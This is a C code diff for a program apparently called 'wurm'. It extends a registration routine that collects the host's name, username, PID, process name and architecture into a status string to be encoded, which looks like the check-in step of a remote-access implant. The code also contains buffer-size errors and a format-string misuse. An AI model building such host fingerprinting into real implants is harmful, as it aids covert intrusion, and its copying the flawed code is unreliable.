@@ -40,7 +40,7 @@ void Register() {
 
     // Set data allocation format
     wurm.data.status = "register";
-    wurm.data.format = "%s:%s";
+    wurm.data.format = "%s:%s%s%d%s%s";
 
     // Enumerate local machine for information
     if (GetComputerNameA(wurm.info.hostname, &default_length)) {
@@ -68,7 +68,7 @@ void Register() {
     if (Process32First(snapshot, &process_info)) {
         while (Process32Next(snapshot, &process_info)) {
             if (wurm.info.pid == process_info.th32ProcessID) {
-                wurm.info.name = process_info.szExeFile;
+                wurm.info.name = strdup(process_info.szExeFile);
                 printf("Process Name: %s\n", wurm.info.name);
             }
         }
@@ -87,17 +87,25 @@ void Register() {
     // Allocate memory to be encoded
     /*
     Registration data structure:
-
+        Format (Status:Hostname,Username,PID,Process Name, Arch)
+        Strings/Integers:
+            Status          8 
+            Hostname        256
+            Username        256
+            Process Name    256
+            Arch            256
+        DWORDS:
+            PID             4
     */
-    INT data_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname);
-    CHAR* data_to_encode = malloc(data_length);
-    sprintf_s(data_to_encode, data_length, wurm.data.format, wurm.data.status, wurm.info.hostname);
+    INT data_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname) + strlen(wurm.info.username) + 4 + strlen(wurm.info.name) + strlen(wurm.info.arch);
+    CHAR* data_pointer = malloc(data_length);
+    sprintf_s(data_pointer, data_length, wurm.data.format, wurm.data.status, wurm.info.hostname, wurm.info.username, wurm.info.pid, wurm.info.name, wurm.info.arch);
 
-    printf(data_to_encode);
+    printf(data_pointer);
 
     // Clean up memory and handles
     CloseHandle(snapshot);
-    free(data_to_encode);
+    free(data_pointer);
 }
 
 int main(int argc, char* argv[]) {
